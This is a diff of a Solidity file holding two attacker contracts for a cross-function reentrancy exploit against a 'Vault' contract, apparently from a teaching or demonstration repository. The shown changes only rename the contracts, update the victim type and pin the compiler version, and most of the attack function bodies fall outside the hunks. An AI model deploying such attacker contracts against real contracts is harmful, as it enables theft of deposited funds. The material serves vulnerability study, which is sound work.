@@ -1,19 +1,19 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+pragma solidity 0.8.20;
 import "./vault.sol";
 
-contract attack_cross_function_reentrancy {
-    cross_function_reentrancy victim;
+contract Attacker {
+    Vault victim;
     uint256 amount = 1 ether;
 
-    attack2_cross_function_reentrancy public attacker2;
+    Attacker2 public attacker2;
 
-    constructor(cross_function_reentrancy _victim) payable {
-        victim = cross_function_reentrancy(_victim);
+    constructor(Vault _victim) payable {
+        victim = Vault(_victim);
     }
 
     function setattacker2(address _attacker2) public {
-        attacker2 = attack2_cross_function_reentrancy(_attacker2);
+        attacker2 = Attacker2(_attacker2);
     }
 
     function attack() public payable {
@@ -36,14 +36,13 @@ contract attack_cross_function_reentrancy {
     }
 }
 
-contract attack2_cross_function_reentrancy {
+contract Attacker2 {
 
- 
     uint256 amount = 1 ether;
-    cross_function_reentrancy victim;
+    Vault victim;
 
-    constructor(cross_function_reentrancy _victim) {
-        victim = cross_function_reentrancy(_victim);
+    constructor(Vault _victim) {
+        victim = Vault(_victim);
     }
 
     function send(uint256 value, address attacker) public {
